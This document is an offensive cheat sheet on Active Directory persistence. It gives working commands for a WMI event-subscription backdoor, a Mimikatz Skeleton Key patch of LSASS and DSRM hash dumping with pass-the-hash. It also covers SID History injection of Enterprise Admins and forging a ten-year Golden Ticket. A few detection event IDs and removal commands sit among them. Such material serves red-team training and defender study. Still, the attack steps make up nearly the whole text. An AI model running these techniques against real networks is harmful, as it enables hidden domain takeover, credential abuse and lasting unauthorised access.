# WMI Subscriptions / Skeleton Key / DSRM / SID History

## WMI Event Subscription (persistent, survives reboot, hard to detect)

```powershell
# Create event filter (trigger condition: system uptime every 60s)
$FilterArgs = @{
    Name           = "BackdoorFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage  = "WQL"
    Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

# Create consumer (what to execute)
$ConsumerArgs = @{
    Name                = "BackdoorConsumer"
    CommandLineTemplate = "C:\Windows\System32\cmd.exe /c C:\temp\backdoor.exe"
}
$Consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

# Bind filter to consumer
New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{
    Filter   = [Ref] $Filter
    Consumer = [Ref] $Consumer
}
```

**Verify subscription exists**
```powershell
Get-CimInstance -Namespace root/subscription -ClassName __EventFilter
Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer
Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding
```

**Remove**
```powershell
Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Remove-CimInstance
Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name='BackdoorConsumer'" | Remove-CimInstance
Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='BackdoorFilter'" | Remove-CimInstance
```

**Detection**: Event ID 5861 (WMI activity log) + Sysmon Event ID 19/20/21. MOF files in `%SystemRoot%\System32\wbem\mof\`.

---

## Skeleton Key (DC memory patch — master password)

Patches LSASS on the domain controller to accept `mimikatz` as password for any domain account.

```
# Requires: domain admin + on the DC
mimikatz # privilege::debug
mimikatz # misc::skeleton

# Now any domain account can authenticate with password "mimikatz"
net use \\DC_IP\admin$ /user:DOMAIN\any_user mimikatz
psexec.py DOMAIN/any_user:mimikatz@TARGET_IP
```

**Limitations**:
- Memory-only, lost on DC reboot
- Only affects the DC where injected (in multi-DC environments, inject on each)
- Detected by AV/EDR that monitors LSASS
- Does NOT affect accounts using AES Kerberos (Protected Users group)

---

## DSRM Account Abuse (DC local admin backdoor)

Directory Services Restore Mode admin — local account on every DC.

```powershell
# On DC: change DSRM logon behavior to allow network logon
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f

# Dump DSRM hash (local SAM on DC)
mimikatz # privilege::debug
mimikatz # lsadump::sam
# Look for "Administrator" in local SAM — that's the DSRM hash

# Use DSRM hash for PTH to DC (even after domain account lockout)
sekurlsa::pth /domain:DC_HOSTNAME /user:Administrator /ntlm:DSRM_HASH /run:cmd.exe
# or
crackmapexec smb DC_IP -u Administrator -H DSRM_HASH --local-auth
```

**Persistence value**: DSRM hash doesn't change unless manually reset — survives domain password policy, account lockouts, and even domain admin password changes.

---

## SID History Injection (cross-domain privilege)

Add a privileged SID (e.g. Enterprise Admins) to a regular user's SID History — grants access without group membership.

```
# Requires domain admin
mimikatz # privilege::debug
mimikatz # sid::patch       -- patch NTDS to allow SID History modification
mimikatz # sid::add /sam:backdoor_user /new:S-1-5-21-ENTERPRISE-519
# S-1-5-21-<root-domain-SID>-519 = Enterprise Admins

# Verify
Get-ADUser backdoor_user -Properties SIDHistory | Select-Object SIDHistory
```

**Cross-forest persistence**: add parent domain's Domain Admins SID (S-1-5-21-<parent>-512) to child domain user → automatic admin in parent domain.

**Detection**: Event ID 4765/4766 (SID History added/failed). BloodHound shows SIDHistory edges.

---

## Golden Ticket Persistence (see also: ad/golden-ticket.md)

```
# Dump krbtgt hash → generate offline TGT valid for 10 years
mimikatz # lsadump::dcsync /user:krbtgt /domain:domain.com
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:DOMAIN_SID \
           /krbtgt:KRBTGT_HASH /endin:87600 /renewmax:262800 /ticket:golden.kirbi

# Use anytime, even after domain admin password change
# Only defeated by rotating krbtgt password TWICE
```
